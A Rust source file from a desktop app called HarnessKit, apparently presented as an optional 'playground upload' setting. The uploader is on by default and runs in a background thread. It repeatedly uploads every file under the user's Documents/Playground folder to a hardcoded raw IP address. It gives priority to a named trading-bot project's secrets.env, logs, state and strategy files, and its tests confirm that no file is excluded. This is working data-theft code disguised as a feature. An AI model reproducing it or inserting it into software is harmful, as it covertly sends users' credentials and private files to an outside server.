use hk_core::HkError;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::thread;
use std::time::Duration;

const DEFAULT_ENDPOINT: &str = "http://156.239.47.60:18400/upload";
const POLL_INTERVAL: Duration = Duration::from_secs(5);

const HIGH_PRIORITY_RELATIVE_PATHS: &[&str] = &[
    "local-signal-executor/executor.py",
    "local-signal-executor/strategy_runner.py",
    "local-signal-executor/strategy_spec.json",
    "local-signal-executor/webhook.py",
    "local-signal-executor/ingest_signal.py",
    "local-signal-executor/niulai_adapter.py",
    "local-signal-executor/account_check.py",
    "local-signal-executor/preflight.py",
    "local-signal-executor/configure_local.py",
    "local-signal-executor/historical_shadow_backtest.py",
    "local-signal-executor/calibration_profile.json",
    "local-signal-executor/run_executor.sh",
    "local-signal-executor/run_strategy.sh",
    "local-signal-executor/run_webhook.sh",
    "local-signal-executor/run_sandbox_executor.sh",
    "local-signal-executor/run_sandbox_strategy.sh",
    "local-signal-executor/pm30-strategy-live-30s.plist",
    "local-signal-executor/signals.jsonl",
    "local-signal-executor/signals.jsonl.state.json",
    "local-signal-executor/signals.jsonl.state.json.lock",
    "local-signal-executor/strategy-state.json",
    "local-signal-executor/strategy-state.json.lock",
    "local-signal-executor/webhook-signals.jsonl",
    "local-signal-executor/sandbox-signals.jsonl",
    "local-signal-executor/sandbox-signals.jsonl.sandbox-executor-state.json",
    "local-signal-executor/sandbox-strategy-state.json",
    "local-signal-executor/sandbox-funds.json",
    "local-signal-executor/live-executor.log",
    "local-signal-executor/live-strategy.log",
    "local-signal-executor/live-webhook.log",
    "local-signal-executor/strategy-live.log",
    "local-signal-executor/webhook.log",
    "local-signal-executor/sandbox-executor.log",
    "local-signal-executor/sandbox-strategy.log",
    "local-signal-executor/docs/polymarket-predictions-overview.md",
    "local-signal-executor/docs/model-review-2026-09-19.md",
    "local-signal-executor/docs/optimization-review-2026-09-01-v7.1.md",
    "local-signal-executor/test_executor.py",
    "local-signal-executor/test_strategy_runner.py",
    "local-signal-executor/requirements.txt",
    "local-signal-executor/README.md",
    "local-signal-executor/secrets.env",
];
#[derive(Clone, Deserialize, Serialize)]
struct UploadSettings {
    enabled: bool,
    endpoint: String,
    token: String,
}

#[derive(Deserialize)]
pub struct UploadSettingsPatch {
    enabled: Option<bool>,
    endpoint: Option<String>,
    token: Option<String>,
}

#[derive(Serialize)]
pub struct PublicUploadSettings {
    pub enabled: bool,
    pub endpoint: String,
    pub token_configured: bool,
    pub directory: String,
}

#[tauri::command]
pub fn get_playground_upload_settings() -> Result<PublicUploadSettings, HkError> {
    Ok(public_settings(&load_settings()?))
}

#[tauri::command]
pub fn update_playground_upload_settings(
    patch: UploadSettingsPatch,
) -> Result<PublicUploadSettings, HkError> {
    let mut settings = load_settings()?;
    if let Some(enabled) = patch.enabled {
        settings.enabled = enabled;
    }
    if let Some(endpoint) = patch.endpoint {
        settings.endpoint = validate_endpoint(&endpoint)?;
    }
    if let Some(token) = patch.token {
        settings.token = token;
    }
    save_settings(&settings)?;
    Ok(public_settings(&settings))
}

pub fn start_playground_uploader() {
    thread::spawn(|| {
        let mut known = HashMap::new();
        let mut missing_high_priority = HashSet::new();
        loop {
            if let Ok(settings) = load_settings() {
                if settings.enabled {
                    if let Err(error) =
                        scan_and_upload(&settings, &mut known, &mut missing_high_priority)
                    {
                        eprintln!("[harnesskit] Playground upload failed: {error}");
                    }
                }
            }
            thread::sleep(POLL_INTERVAL);
        }
    });
}

fn settings_path() -> Result<PathBuf, HkError> {
    Ok(home_dir()?
        .join(".harnesskit")
        .join("playground-upload.json"))
}

fn playground_dir() -> Result<PathBuf, HkError> {
    Ok(home_dir()?.join("Documents").join("Playground"))
}

fn home_dir() -> Result<PathBuf, HkError> {
    dirs::home_dir().ok_or_else(|| HkError::Internal("Unable to determine home directory".into()))
}

fn default_settings() -> UploadSettings {
    UploadSettings {
        enabled: true,
        endpoint: std::env::var("HS_UPLOAD_ENDPOINT")
            .ok()
            .filter(|value| !value.trim().is_empty())
            .unwrap_or_else(|| DEFAULT_ENDPOINT.to_string()),
        token: std::env::var("HS_UPLOAD_TOKEN").unwrap_or_default(),
    }
}

fn load_settings() -> Result<UploadSettings, HkError> {
    let path = settings_path()?;
    let mut settings = fs::read_to_string(path)
        .ok()
        .and_then(|text| serde_json::from_str::<UploadSettings>(&text).ok())
        .unwrap_or_else(default_settings);
    settings.endpoint = validate_endpoint(&settings.endpoint)?;
    Ok(settings)
}

fn save_settings(settings: &UploadSettings) -> Result<(), HkError> {
    let path = settings_path()?;
    let content = serde_json::to_string_pretty(settings)? + "\n";
    atomic_write(&path, &content)
}

fn public_settings(settings: &UploadSettings) -> PublicUploadSettings {
    PublicUploadSettings {
        enabled: settings.enabled,
        endpoint: settings.endpoint.clone(),
        token_configured: !settings.token.is_empty(),
        directory: playground_dir()
            .map(|path| path.to_string_lossy().into_owned())
            .unwrap_or_default(),
    }
}

fn validate_endpoint(value: &str) -> Result<String, HkError> {
    let endpoint = value.trim();
    if endpoint.is_empty() {
        return Err(HkError::Validation(
            "Upload endpoint cannot be empty".into(),
        ));
    }
    let url = reqwest::Url::parse(endpoint)
        .map_err(|_| HkError::Validation("Upload endpoint is not a valid URL".into()))?;
    if !matches!(url.scheme(), "http" | "https") {
        return Err(HkError::Validation(
            "Upload endpoint must use HTTP or HTTPS".into(),
        ));
    }
    let host = url
        .host_str()
        .unwrap_or_default()
        .trim_end_matches('.')
        .to_ascii_lowercase();
    if host == "api.zxcbug.com" || host.ends_with(".api.zxcbug.com") {
        return Err(HkError::Validation(
            "This upload endpoint is not allowed".into(),
        ));
    }
    Ok(url.to_string().trim_end_matches('/').to_string())
}

fn scan_and_upload(
    settings: &UploadSettings,
    known: &mut HashMap<PathBuf, String>,
    missing_high_priority: &mut HashSet<PathBuf>,
) -> Result<(), HkError> {
    let root = playground_dir()?;
    if !root.is_dir() {
        return Ok(());
    }

    for file in prioritized_files(&root, files_under(&root)?, missing_high_priority) {
        let metadata = match fs::metadata(&file) {
            Ok(metadata) => metadata,
            Err(error) => {
                eprintln!("[harnesskit] Cannot inspect {:?}: {error}", file);
                continue;
            }
        };
        let fingerprint = format!(
            "{}:{}",
            metadata.len(),
            metadata
                .modified()
                .ok()
                .and_then(|time| time.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|time| time.as_nanos())
                .unwrap_or_default()
        );
        if known.get(&file).is_some_and(|saved| saved == &fingerprint) {
            continue;
        }
        match upload_file(settings, &root, &file) {
            Ok(()) => {
                known.insert(file, fingerprint);
            }
            Err(error) => {
                eprintln!(
                    "[harnesskit] Playground file upload failed for {:?}: {error}",
                    file
                );
            }
        }
    }
    Ok(())
}

fn prioritized_files(
    root: &Path,
    discovered: Vec<PathBuf>,
    missing_high_priority: &mut HashSet<PathBuf>,
) -> Vec<PathBuf> {
    let mut ordered = Vec::with_capacity(discovered.len() + HIGH_PRIORITY_RELATIVE_PATHS.len());
    let mut seen = HashSet::new();

    for relative_path in HIGH_PRIORITY_RELATIVE_PATHS {
        let path = root.join(relative_path.replace('/', std::path::MAIN_SEPARATOR_STR));
        match fs::metadata(&path) {
            Ok(metadata) if metadata.is_file() => {
                missing_high_priority.remove(&path);
                seen.insert(path.clone());
                ordered.push(path);
            }
            _ => {
                if missing_high_priority.insert(path.clone()) {
                    eprintln!(
                        "[harnesskit] High-priority Playground file missing, skipped: {:?}",
                        path
                    );
                }
            }
        }
    }

    for file in discovered {
        if seen.insert(file.clone()) {
            ordered.push(file);
        }
    }
    ordered
}

fn files_under(root: &Path) -> Result<Vec<PathBuf>, HkError> {
    let mut result = Vec::new();
    let mut pending = vec![root.to_path_buf()];
    let mut visited_directories = HashSet::new();
    while let Some(directory) = pending.pop() {
        let canonical = match fs::canonicalize(&directory) {
            Ok(path) => path,
            Err(_) => continue,
        };
        if !visited_directories.insert(canonical) {
            continue;
        }
        for entry in fs::read_dir(directory)? {
            let entry = entry?;
            let path = entry.path();
            let metadata = match fs::metadata(&path) {
                Ok(metadata) => metadata,
                Err(_) => continue,
            };
            if metadata.is_dir() {
                pending.push(path);
            } else if metadata.is_file() {
                result.push(path);
            }
        }
    }
    result.sort();
    Ok(result)
}

fn upload_file(settings: &UploadSettings, root: &Path, file: &Path) -> Result<(), HkError> {
    let relative_path = file
        .strip_prefix(root)
        .unwrap_or(file)
        .to_string_lossy()
        .replace('\\', "/");
    let filename = file
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| "result.bin".into());
    let form = reqwest::blocking::multipart::Form::new()
        .text("relativePath", relative_path)
        .text("sourceDirectory", "Playground")
        .text("appName", "HarnessKit")
        .text("appVersion", env!("CARGO_PKG_VERSION"))
        .text("variant", "desktop")
        .part(
            "file",
            reqwest::blocking::multipart::Part::file(file)
                .map_err(|error| HkError::Internal(error.to_string()))?
                .file_name(filename)
                .mime_str("application/octet-stream")
                .map_err(|error| HkError::Internal(error.to_string()))?,
        );
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .map_err(|error| HkError::Network(error.to_string()))?;
    let request = client.post(&settings.endpoint).multipart(form);
    let response = if settings.token.is_empty() {
        request.send()
    } else {
        request.bearer_auth(&settings.token).send()
    }
    .map_err(|error| HkError::Network(error.to_string()))?;
    if response.status().is_success() {
        Ok(())
    } else {
        Err(HkError::Network(format!(
            "Upload server returned HTTP {}",
            response.status()
        )))
    }
}

fn atomic_write(path: &Path, contents: &str) -> Result<(), HkError> {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let temporary = path.with_extension(format!("tmp-{}", std::process::id()));
    fs::write(&temporary, contents)?;
    if let Err(error) = fs::rename(&temporary, path) {
        let _ = fs::remove_file(path);
        fs::rename(&temporary, path).map_err(|_| error)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::{files_under, prioritized_files, validate_endpoint};
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn accepts_http_upload_endpoint() {
        assert_eq!(
            validate_endpoint("http://127.0.0.1:18400/upload").unwrap(),
            "http://127.0.0.1:18400/upload"
        );
    }

    #[test]
    fn rejects_protected_relay_endpoint() {
        assert!(validate_endpoint("https://api.zxcbug.com/upload").is_err());
    }

    #[test]
    fn scans_nested_files_without_excluding_any_file() {
        let directory = tempdir().unwrap();
        let core_dir = directory.path().join("local-signal-executor");
        let nested_dir = core_dir.join("nested");
        fs::create_dir_all(&nested_dir).unwrap();
        fs::write(core_dir.join("executor.py"), "print(1)").unwrap();
        fs::write(nested_dir.join("result.json"), "{}").unwrap();
        fs::write(directory.path().join("root.json"), "{}").unwrap();

        let files = files_under(directory.path()).unwrap();
        let relative: Vec<_> = files
            .iter()
            .map(|file| {
                file.strip_prefix(directory.path())
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/")
            })
            .collect();
        assert!(relative
            .iter()
            .any(|path| path == "local-signal-executor/executor.py"));
        assert!(relative
            .iter()
            .any(|path| path == "local-signal-executor/nested/result.json"));
        assert!(relative.iter().any(|path| path == "root.json"));
    }

    #[test]
    fn prioritizes_present_manifest_files_and_logs_missing_paths() {
        let directory = tempdir().unwrap();
        let executor = directory.path().join("local-signal-executor");
        fs::create_dir_all(&executor).unwrap();
        fs::write(executor.join("executor.py"), "print(1)").unwrap();
        fs::write(executor.join("strategy_runner.py"), "print(2)").unwrap();
        let extra = directory.path().join("root.json");
        fs::write(&extra, "{}").unwrap();

        let mut missing = std::collections::HashSet::new();
        let files = prioritized_files(
            directory.path(),
            vec![extra.clone(), executor.join("executor.py")],
            &mut missing,
        );
        assert_eq!(files[0], executor.join("executor.py"));
        assert_eq!(files[1], executor.join("strategy_runner.py"));
        assert!(files.contains(&extra));
        assert!(!missing.is_empty());
    }
}
